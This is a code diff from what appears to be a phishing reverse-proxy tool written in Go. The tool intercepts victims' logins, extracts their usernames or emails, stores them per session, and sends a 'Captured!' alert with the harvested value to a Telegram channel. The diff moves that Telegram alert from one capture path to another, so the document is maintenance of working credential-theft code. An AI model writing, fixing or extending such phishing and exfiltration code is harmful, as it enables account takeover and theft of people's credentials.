@@ -695,12 +695,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] A Username: [%s]", ps.Index, um[1])
-									message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
-									✉️ <b>Email/Username:</b> %s
-									🔑 <b>Session ID:</b> %d`, 
-										um[1],
-										ps.Index)
-									p.telegram.SendMessage(message)
+									// message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
+									// ✉️ <b>Email/Username:</b> %s
+									// 🔑 <b>Session ID:</b> %d`, 
+									// 	um[1],
+									// 	ps.Index)
+									// p.telegram.SendMessage(message)
 
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
@@ -790,12 +790,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
-											// message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
-											// ✉️ <b>Email/Username:</b> %s
-											// 🔑 <b>Session ID:</b> %d`, 
-											// 	um[1],
-											// 	ps.Index)
-											// p.telegram.SendMessage(message)
+											message := fmt.Sprintf(`📧 <b>Email/Username Captured!</b>
+											✉️ <b>Email/Username:</b> %s
+											🔑 <b>Session ID:</b> %d`, 
+												um[1],
+												ps.Index)
+											p.telegram.SendMessage(message)
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
